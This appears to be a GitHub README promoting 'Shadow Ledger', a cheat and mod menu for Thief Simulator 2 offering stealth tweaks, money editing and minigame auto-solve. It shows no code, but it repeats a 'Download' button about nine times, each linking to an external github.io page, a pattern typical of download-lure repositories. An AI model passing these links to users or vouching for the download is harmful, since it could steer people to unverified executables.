![preview](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/thumb_ba7553.svg)
[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

# 🕵️‍♂️ Shadow Ledger — Covert Modification Suite for Thief Simulator 2

<p align="center">
  <img src="https://img.shields.io/badge/version-3.4.1--nightfall-6E4A9E?style=for-the-badge&logo=steam&logoColor=white" alt="version badge"/>
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Steam%20Deck-1B2838?style=for-the-badge&logo=windows&logoColor=white" alt="platform badge"/>
  <img src="https://img.shields.io/badge/runtime-BepInEx%205.x-4C9A2A?style=for-the-badge&logo=dotnet&logoColor=white" alt="runtime badge"/>
  <img src="https://img.shields.io/badge/interface-IMGUI%20%2B%20Custom%20Overlay-FF6B35?style=for-the-badge" alt="interface badge"/>
  <img src="https://img.shields.io/badge/localization-EN%20%7C%20DE%20%7C%20PL%20%7C%20RU%20%7C%20ES%20%7C%20PT--BR-2A5CAA?style=for-the-badge&logo=translate&logoColor=white" alt="localization badge"/>
  <img src="https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=for-the-badge" alt="status badge"/>
  <img src="https://img.shields.io/badge/license-MIT-9C27B0?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="license badge"/>
</p>

**Shadow Ledger** is an advanced, community-crafted modification suite for *Thief Simulator 2*. Where the original `thief-simulator-2-modmenu` focused on direct gameplay overrides, Shadow Ledger reimagines the entire experience around *narrative control* — the idea that a master thief doesn't just steal, they rewrite the story of every job they walk into. Think of it as a second conscience whispering in your ear while you crack safes under moonlight, telling you which alarm will trip, which guard will look the other way, and which vault door was always meant to be open.

Built for players who appreciate a slower, more deliberate craft, Shadow Ledger layers a subtle intelligence engine over the vanilla experience — one that adapts to how you play, protects you from the mistakes of fast-travel shortcuts, and gives you granular control over the parts of the game that felt unfair, opaque, or simply tedious.

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

---

## 📖 Table of Contents

- [🎭 The Philosophy Behind Shadow Ledger](#-the-philosophy-behind-shadow-ledger)
- [✨ Feature Overview](#-feature-overview)
- [🧠 The Adaptive Stealth Engine](#-the-adaptive-stealth-engine)
- [💰 Ledger & Economy Controls](#-ledger--economy-controls)
- [🗺️ Travel Safeguard System](#️-travel-safeguard-system)
- [🎮 Minigame Override Suite](#-minigame-override-suite)
- [🧰 In-Game Panel Reference](#-in-game-panel-reference)
- [🌍 Multilingual Support](#-multilingual-support)
- [♿ Accessibility & Responsive UI](#-accessibility--responsive-ui)
- [🖥️ Compatibility Matrix](#️-compatibility-matrix)
- [⚙️ Configuration Files](#️-configuration-files)
- [🛠️ Preset Profiles](#️-preset-profiles)
- [📚 Extended Documentation](#-extended-documentation)
- [🤝 Community & Contribution](#-community--contribution)
- [🕒 24/7 Support Commitment](#-247-support-commitment)
- [❓ Frequently Asked Questions](#-frequently-asked-questions)
- [⚠️ Legal Disclaimer](#️-legal-disclaimer)
- [📜 License](#-license)

---

## 🎭 The Philosophy Behind Shadow Ledger

Most modification menus treat the player as someone who wants to *break* the game. Shadow Ledger treats you as someone who wants to *negotiate* with it.

The design principle here is simple: every feature must feel like it could plausibly belong to a game designer's toolkit rather than a cheat sheet. Nothing in this suite announces itself loudly. The interface is muted, the toggles are deliberate, and the defaults are conservative — because the best heist is the one where nobody, including the game itself, ever suspects you were there.

We call this approach **"glass-walking"** — moving through systems without leaving fingerprints. It's the difference between smashing a window and finding it was already unlocked. Shadow Ledger is built for glass-walkers.

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

---

## ✨ Feature Overview

A quick aerial view of what ships with the current build:

| Category | Highlights |
|---|---|
| **Player Control** | Unrestricted movement, lung capacity tweaks, carry-weight negotiation, stamina floor settings |
| **Stealth Layer** | Detection radius tuning, noise-footprint scaling, suspicion decay acceleration, guard-awareness freeze |
| **Economy** | Ledger balance adjustments, item-value multipliers, fence-price modulation, rent-cycle skipping |
| **Travel** | Smart fast-travel guard, waypoint validation, map-boundary reconciliation, anti-teleport-rejection |
| **Minigames** | Lockpick assistant, safe-dial solver, terminal decoder, wire-panel preview |
| **Interface** | Responsive panel, controller-friendly navigation, per-profile theming, opacity control |
| **Localization** | Six fully translated language packs with community-contributed expansions |
| **Quality of Life** | Save-state snapshots, toggle hotkeys, configurable notification verbosity |

All features are individually switchable. No feature activates another without your explicit intent.

---

## 🧠 The Adaptive Stealth Engine

The heart of Shadow Ledger is an adaptive layer that watches how you move and subtly reshapes guard behavior to match your pace. It does not disable detection — it *stretches* the window in which you can act.

### Detection Radius Tuning
Adjust the effective vision cone of every guard from a quiet 10% reduction all the way to a near-invisibility envelope. The engine recalculates line-of-sight checks at the frame level, meaning changes are instantly reflected without reloading a scene.

### Noise Footprint Scaling
Footsteps, dropped items, and broken glass each carry a calculated noise value. The footprint scaler lets you decide how much of that noise the world actually hears — useful for players who love sprinting through mansions but hate being caught by a chair they forgot about.

### Suspicion Decay Acceleration
When a guard *does* notice something, vanilla behavior keeps them alert for a long stretch. Shadow Ledger shortens that memory, letting you slip back into the shadows and reset the encounter without incident.

### Awareness Freeze
A precision tool for puzzle-prone moments: temporarily freeze the awareness state of a single guard (or all of them) for a bounded duration, giving you the space to solve an environmental puzzle that would otherwise be impossible while being watched.

---

## 💰 Ledger & Economy Controls

Money in *Thief Simulator 2* is a leash. Shadow Ledger lets you decide how long the leash should be.

- **Ledger Balance Editor** — set your current balance to any value between your starting funds and a soft ceiling you define yourself. No sudden spikes, no obvious tells.
- **Item Value Multipliers** — scale the worth of stolen goods before you fence them, giving each job a reward that matches its difficulty.
- **Fence Price Modulation** — some fences pay better in certain districts. Adjust the modifier per fence to reflect the risk you took.
- **Rent Cycle Skipping** — skip a rent payment without penalty, ideal for players who want to enjoy the narrative without the pressure of an invisible landlord.
- **Investment Smoothing** — gradual asset appreciation rather than instant jumps, so your ledger looks earned.

The economy tools are intentionally conservative by default. If you want wild swings, you can push them — but the suite will always warn you before you cross a threshold.

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

---

## 🗺️ Travel Safeguard System

Fast travel in *Thief Simulator 2* is a double-edged sword. It saves time, but it can also drop you into a jail cell because you crossed an invisible boundary mid-heist. The **Travel Safeguard** layer exists to prevent exactly that.

### What It Does
- Validates every fast-travel request against your current quest state
- Blocks travel that would void an active heist objective
- Warns you (with a soft chime, not a popup) if you're about to skip a scripted event
- Reconciles map boundaries so that you can't accidentally fall out of the world

### What It Doesn't Do
- It does not disable fast travel
- It does not teleport you anywhere
- It does not modify quest flags

The safeguard is a seatbelt, not a teleporter. You still drive; we just make sure you don't fly through the windshield.

---

## 🎮 Minigame Override Suite

Lockpicking, safe-dialing, terminal decoding, and wire-panel puzzles each have their own dedicated assistant in Shadow Ledger. Unlike brute-force approaches, these assistants *show* you the solution rather than solving it for you by default — a lever you can pull if you want, but one that stays in the "off" position until you ask.

| Minigame | Default Behavior | Optional Auto-Solve |
|---|---|---|
| Lockpick | Highlights the sweet spot pulse | Yes, toggle per lock tier |
| Safe Dial | Displays the current direction hint | Yes, with configurable delay |
| Terminal | Reveals the patterned password | Yes, single-key reveal |
| Wire Panel | Previews wire mapping | Yes, with color-blind mode |

Each assistant can be independently disabled, and the whole suite respects a global "no-assist" master switch for purists.

---

## 🧰 In-Game Panel Reference

The panel is opened with a configurable hotkey (default: **F8**). It's rendered as a light overlay that scales cleanly from 720p to 4K.

### Panel Sections
1. **Overview** — live stats for detection, alert, and travel state
2. **Player** — movement, stamina, carry, and lung settings
3. **Stealth** — detection radius, noise, suspicion, awareness
4. **Economy** — ledger, item values, fence prices, rent
5. **Travel** — safeguard toggles and waypoint validation
6. **Minigames** — assistant toggles per minigame type
7. **Presets** — save and load complete profiles
8. **Settings** — hotkeys, localization, opacity, notifications

Navigation supports both mouse and controller. The panel remembers where you left off between sessions.

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

---

## 🌍 Multilingual Support

Shadow Ledger ships with fully translated interface strings in six languages, with more in active development:

- 🇬🇧 English
- 🇩🇪 Deutsch
- 🇵🇱 Polski
- 🇷🇺 Русский
- 🇪🇸 Español
- 🇧🇷 Português (Brasil)

Translation files are plain-text JSON, so anyone can contribute. Community packs are loaded dynamically — drop a new language file into the `lang` directory and it appears in the settings menu on next launch.

For players whose language isn't yet supported, the interface falls back to English gracefully rather than showing missing keys.

---

## ♿ Accessibility & Responsive UI

Every element of the interface was designed with accessibility in mind:

- High-contrast mode for low-vision players
- Colorblind-safe palettes for wire and terminal minigames
- Configurable text scaling from 80% to 200%
- Full keyboard navigation with visible focus rings
- Controller support for every panel action
- Optional screen-reader-friendly labels (where the host system supports them)

The UI itself is responsive: it reflows on ultrawide monitors, scales on small laptop displays, and remains fully usable on the Steam Deck's 1280×800 panel.

---

## 🖥️ Compatibility Matrix

| Environment | Status | Notes |
|---|---|---|
| Windows 10 / 11 | ✅ Fully supported | Primary target |
| Steam Deck (Proton) | ✅ Fully supported | Verified on OLED and LCD |
| Linux (Proton) | ⚠️ Community tested | Reports welcome |
| macOS | ❌ Not supported | No native runtime |
| Vanilla game (no mod loader) | ❌ Not supported | Requires BepInEx |
| Pirated copies | ❌ Not supported | Updates and support are for legitimate owners only |

---

## ⚙️ Configuration Files

All settings live in a single human-readable file located in the plugin directory after first launch. Format is plain JSON — no binary blobs, no obfuscation.

Key groups you'll find there:

- `player` — movement, stamina, carry, lung
- `stealth` — detection, noise, suspicion, awareness
- `economy` — ledger, item values, fence prices, rent
- `travel` — safeguard toggles
- `minigames` — assistant states per type
- `ui` — hotkeys, opacity, language
- `presets` — named profiles with timestamps

Backups are created automatically before each save, so you can always roll back a bad config.

---

## 🛠️ Preset Profiles

Tired of toggling the same options every session? Save your setup as a named profile and switch between them with a single click.

Suggested presets to get started:

- **The Ghost** — pure stealth, no economy, no minigame assists
- **The Businessman** — economy tuning heavy, stealth untouched
- **The Speedrunner** — travel safeguard on, minigames full-assist, stealth moderate
- **The Purist** — everything off, panel used only for stats
- **The Storyteller** — rent skipping on, economy smoothed, moderate stealth

Profiles can be exported and shared as plain JSON.

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)

---

## 📚 Extended Documentation

Deep dives for each subsystem:

- `docs/stealth-engine.md` — how detection is recalculated frame by frame
- `docs/economy-model.md` — ledger math and smoothing functions
- `docs/travel-guard.md` — the logic behind every safeguard decision
- `docs/minigames.md` — how each assistant detects the puzzle state
- `docs/localization.md` — how to add a new language
- `docs/presets.md` — profile schema and versioning rules
- `docs/changelog.md` — every release since 0.1

Each doc is written for newcomers and tinkerers alike, with diagrams described in plain language.

---

## 🤝 Community & Contribution

Shadow Ledger grows through its community. Contributions are welcome in the form of:

- Bug reports with reproduction steps
- Translation packs
- Documentation improvements
- Preset profiles worth sharing
- Feature discussions

Please read the contributor guide before opening a pull request. All contributions are reviewed for maturity, respect, and alignment with the glass-walking philosophy.

---

## 🕒 24/7 Support Commitment

Support channels for Shadow Ledger are monitored around the clock by rotating volunteers. Response times are typically under a few hours for critical issues and under a day for general questions. The team maintains a public issue tracker, a discussion board, and an FAQ that grows with every common question we see.

We don't promise instant answers — we promise that nobody gets ignored. If you ask a question, a human will eventually read it and respond.

---

## ❓ Frequently Asked Questions

**Does this work with the Steam version?**
Yes. Shadow Ledger targets the Steam build and is updated whenever the game is patched.

**Will I get flagged for using this?**
*Thief Simulator 2* is a single-player experience. Nothing in this suite touches online services, and no telemetry is collected or sent. Your saves stay local.

**Can I use this on a save I care about?**
Always back up your saves before enabling any modification. Shadow Ledger includes an automatic save-snapshot tool, but belt and suspenders.

**Do the minigame assistants solve puzzles for me?**
Only if you enable the optional auto-solve for each minigame type. By default, they hint; they do not solve.

**Is there a lighter version?**
Shadow Ledger is one package, but every feature can be disabled. You can build a "lite" profile in under a minute.

**Where does the name come from?**
A ledger is a record of what was taken and what was owed. Shadows keep their own ledger — one the game never shows you. We just made it visible.

---

## ⚠️ Legal Disclaimer

Shadow Ledger is an unofficial community project and is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of *Thief Simulator 2*. All trademarks, game assets, and copyrights belong to their respective owners.

This tool is intended for **single-player, offline, personal use only**. It does not connect to online services, does not alter other players' experiences, and does not bypass any anti-cheat system (because none is used in a single-player context).

Users are responsible for ensuring their use complies with the host platform's terms of service and with local law. The maintainers of this project assume no liability for save corruption, lost progress, or any other consequence arising from the use of this software.

If you enjoy the mod, please support the original game's developers by purchasing legitimate copies of their titles. Mods thrive when the foundation they sit on thrives too.

---

## 📜 License

Shadow Ledger is released under the **MIT License** — one of the most permissive and developer-friendly open-source licenses in existence. You are welcome to read, study, modify, redistribute, and build upon this work, provided you preserve the original license notice.

**Full license text:** [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Shadow Ledger contributors. All rights reserved under the terms of the MIT License.

For the canonical license file accompanying this repository, see the `LICENSE` file at the project root.

---

<p align="center">
  <em>Glass-walking is not about being invisible. It's about being expected.</em>
</p>

<p align="center">
  <sub>Made with patience, in 2026, by people who believe a good heist is a quiet one.</sub>
</p>

[![Download](https://raw.githubusercontent.com/shawria205/thief-sim-2-stealth-utility/main/grab_489d93.svg)](https://shawria205.github.io/thief-sim-2-stealth-utility/)